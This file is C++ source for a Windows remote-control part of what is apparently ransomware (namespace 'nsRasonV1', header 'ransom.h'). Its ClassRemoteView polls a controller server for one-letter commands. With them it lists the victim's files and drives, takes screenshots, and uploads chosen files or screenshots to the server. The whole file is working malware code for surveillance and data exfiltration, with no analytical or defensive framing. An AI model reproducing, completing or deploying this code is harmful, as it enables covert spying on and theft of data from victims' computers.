#include "ransom.h"
#include <windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <atlimage.h>
#include <vector>
#include <sstream>
#include <fstream>

#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")

#define DEFAULT_BUFLEN 512
#define DEFAULT_MAXFILE 2080000
#define DEFAULT_PORT "80"

#define BOUNDARY_DOC "270103019722027841342355369633"
#define BOUNDARY_JPG "371588535111824475973752136518"
#define FILETYPE_DOC "application/vnd.openxmlformats-officedocument.wordprocessingml.document"
#define FILETYPE_JPG "image/jpeg"
using std::string;
using std::cout;
using std::endl;
using std::wstring;
using std::stringstream;
using std::vector;
using std::ofstream;
string strServerGlobal;
string strFileTransmit = "sendImage.jpg";
bool bTransmit = FALSE;
string strpreviousOrder = "";
string strUserGlobal;
namespace nsRasonV1
{
	ClassRansom classRansom;
	LPCTSTR ClassRemoteView::strToLPCTSTR(const string& strString)
	{						
		size_t newsize = strlen(strString.c_str()) + 1;
		wchar_t * wcString = new wchar_t[newsize];
		size_t cChars = 0;
		mbstowcs_s(&cChars, wcString, newsize, strString.c_str(), _TRUNCATE);
		LPCTSTR myLPCTSTR = wcString;
		return myLPCTSTR;
	}
	bool ClassRemoteView::ScreenCapture(string strPathTransmit)
	{	
		HRESULT hres;
		int width = GetSystemMetrics(SM_CXSCREEN);
		int height = GetSystemMetrics(SM_CYSCREEN);
		HDC hDc = CreateCompatibleDC(0);	
		HBITMAP hBmp = CreateCompatibleBitmap(GetDC(0), width, height);
		SelectObject(hDc, hBmp);		
		BitBlt(hDc, 0, 0, width, height, GetDC(0), 0, 0, SRCCOPY);
		ATL::CImage img;
		img.Attach(hBmp, img.DIBOR_DEFAULT);	
		hres = img.Save(strToLPCTSTR(strPathTransmit), Gdiplus::ImageFormatJPEG);
		if (SUCCEEDED(hres))
		{
			DeleteObject(hBmp);
			DeleteDC(hDc);
			return true;
		}
		return false;
	}
	bool ClassRemoteView::isDir(string strPath)
	{
		WIN32_FIND_DATA FindFileData;
		HANDLE hFind = INVALID_HANDLE_VALUE;
		LPCWSTR LPath = classRansom.strToLPCWSTR(strPath);
		hFind = FindFirstFile(LPath, &FindFileData);
		if (hFind == INVALID_HANDLE_VALUE)
		{			
			return true;
		}
		else
		{
			if (FindFileData.dwFileAttributes <32)
			{
				return true;
			}			
		}
		return false;
	}
	
	string ClassRemoteView::strFixPath(string strPath)
	{
		string strTemp = "";

		for (unsigned int i = 0; i < strPath.length(); i++)
		{
			if (strPath[i] == '\\')
			{

				if (strPath[i + 1] != '\\')
				{
					strTemp.append("\\");
				}

			}
		string s(1, strPath[i]);
			strTemp.append(s);
		}
		return strTemp;
	}
	string ClassRemoteView::listFiles(string strPath)
	{		
		string strResult("");
		string strSeparator(",");
		WIN32_FIND_DATA FindFileData;
		HANDLE hFind = INVALID_HANDLE_VALUE;
		LPCWSTR LPath = classRansom.strToLPCWSTR(strPath);
		std::wcout << LPath << endl;
		hFind = FindFirstFile(LPath, &FindFileData);
		if (hFind == INVALID_HANDLE_VALUE)
		{			
			return "Incorrect Handle";
		}
		else
		{			
			string fil = strPath.substr(0, strPath.length() - 3);
			wstring fil2 = FindFileData.cFileName;
			strResult.append(fil);
			strResult.append(strSeparator);
			strResult.append(classRansom.wStringToString(fil2));
			strResult.append(strSeparator);
			while (FindNextFile(hFind, &FindFileData) != 0)
			{
				if (FindFileData.dwFileAttributes < 8231)
				{
					strResult.append(classRansom.wStringToString(FindFileData.cFileName));
					strResult.append(strSeparator);
				}
			}
		}
		return strResult;
	}
	void ClassRemoteView::sendReply(string strUser, string strMessage)
	{
		string MessageRec = "";
		if (strUser.compare("nuevo") == 0)
		{
			MessageRec = classRansom.strClientSocket(strServerGlobal, classRansom.strMessageGet(strServerGlobal, strUser, "", ""));
		}
		else
		{
			MessageRec = classRansom.strClientSocket(strServerGlobal,classRansom.strMessageGet(strServerGlobal,strUser, "confirm", strMessage));
		}
	}
	string ClassRemoteView::urlencode(const string &s)
	{
		static const char lookup[] = "0123456789abcdef";
		stringstream e;
		for (int i = 0, ix = s.length(); i<ix; i++)
		{
			const char& c = s[i];
			if ((48 <= c && c <= 57) ||//0-9
				(65 <= c && c <= 90) ||//abc...xyz
				(97 <= c && c <= 122) || //ABC...XYZ
				(c == '-' || c == '_' || c == '.' || c == '~')
				)
			{
				e << c;
			}
			else
			{
				e << '%';
				e << lookup[(c & 0xF0) >> 4];
				e << lookup[(c & 0x0F)];
			}
		}
		return e.str();
	}
	string ClassRemoteView::strUnit()
	{
		WCHAR volumeName[MAX_PATH + 1] = { 0 };
		WCHAR fileSystemName[MAX_PATH + 1] = { 0 };
		DWORD serialNumber = 0;
		DWORD maxComponentLen = 0;
		DWORD fileSystemFlags = 0;
		string strUnits[] = { "C:\\" ,"D:\\" ,"E:\\" ,"F:\\" ,"G:\\" ,"H:\\" ,"I:\\" ,"J:\\" ,"K:\\" ,"L:\\" ,"M:\\" ,"N:\\" ,"O:\\","P:\\","Q:\\","R:\\","S:\\","T:\\","U:\\","V:\\","W:\\","X:\\","Y:\\","Z:\\" };
		string unitsDetect = "";
		for (int i = 0;i < 24;i++)
		{
			LPCWSTR result = classRansom.strToLPCWSTR(strUnits[i]);
			if (GetVolumeInformation(result, volumeName, sizeof(volumeName), &serialNumber, &maxComponentLen, &fileSystemFlags, fileSystemName, sizeof(fileSystemName)) == TRUE)
			{
				/*wprintf(L"GetVolumeInformation() should be fine!\n");
				wprintf(L"Volume Name : %s\n", volumeName);
				wprintf(L"Serial Number : %lu\n", serialNumber);
				wprintf(L"File System Name : %s\n", fileSystemName);
				wprintf(L"Max Component Length : %lu\n", maxComponentLen);
				wprintf(L"File system flags : 0X%.08X\n", fileSystemFlags);*/
				unitsDetect.append(strUnits[i] + ",");
			}			
		}
		return unitsDetect;
	}
	void ClassRemoteView::vWrite(string strPath, string strContent)
	{		
		string strPathLocalAppData = classRansom.varEnviroiment("LOCALAPPDATA");
		strPathLocalAppData.append(strPath);
		ofstream ofs(strPathLocalAppData, ofstream::out);
		ofs << strContent;
		ofs.close();
	}
	string ClassRemoteView::strAsteriskToSpace(string strMessage)
	{
		for (unsigned int i = 0; i < strMessage.length(); i++)
		{
			if (strMessage[i] == '*')strMessage[i] = ' ';
		}
		return strMessage;
	}
	void ClassRemoteView::vConnect(string strUser)
	{
		string strMessageRead = "";
		if (strUser.compare("nuevo")==0)
		{			
			strMessageRead = classRansom.strClientSocket(strServerGlobal,classRansom.strMessageGet(strServerGlobal, strUser, "", ""));
		}
		else
		{
			strMessageRead = classRansom.strClientSocket(strServerGlobal, classRansom.strMessageGet(strServerGlobal,strUser, "ok", ""));
			
		}
		int ver = strMessageRead.find("UTF-8") + 9;
		int final = strMessageRead.find("!");
		string strOrder = strMessageRead.substr(ver, final);
		strOrder = strOrder.substr(0, final - ver);
		strOrder = strFixPath(strOrder);
		strOrder = strAsteriskToSpace(strOrder);

		if (strOrder[0] == 't') bTransmit = TRUE;
		else bTransmit = FALSE;

		if (strpreviousOrder.compare(strOrder) != 0 || bTransmit == TRUE)
		{
			strpreviousOrder = strOrder;			
			char chCommand = strOrder[0];
			string strTodo = "*.*";
			strOrder = strOrder.substr(1);
			bool ifSuccess = false;

			switch (chCommand)
			{
			case 'a':					
				sendReply(strUser,urlencode(listFiles(strOrder + strTodo)));
				break;
			case 'l':
				sendReply(strUser,strFixPath(strUnit()));				
				break;
			case 'e':
				if (!isDir(strOrder))
				{
					classRansom.bProcess(strOrder);					
				}
				break;
			case 'u':
				vWrite("us.txt", strOrder);
				strUserGlobal = strOrder;				
				break;
			case 't':				
				if (bTransmit)
				{
					string strTempPathImage = classRansom.varEnviroiment("LOCALAPPDATA");
					strTempPathImage.append(strFileTransmit);					
					ifSuccess = ScreenCapture(strTempPathImage);
					if (ifSuccess)
					{						
						classRansom.bProcess(strTempPathImage);						
					}
				}
				break;
			default:
				break;
			}
		}
	}
	ClassRemoteView::ClassRemoteView(string strServerRemote)
	{		
		strServerGlobal = strServerRemote;		
	}
}
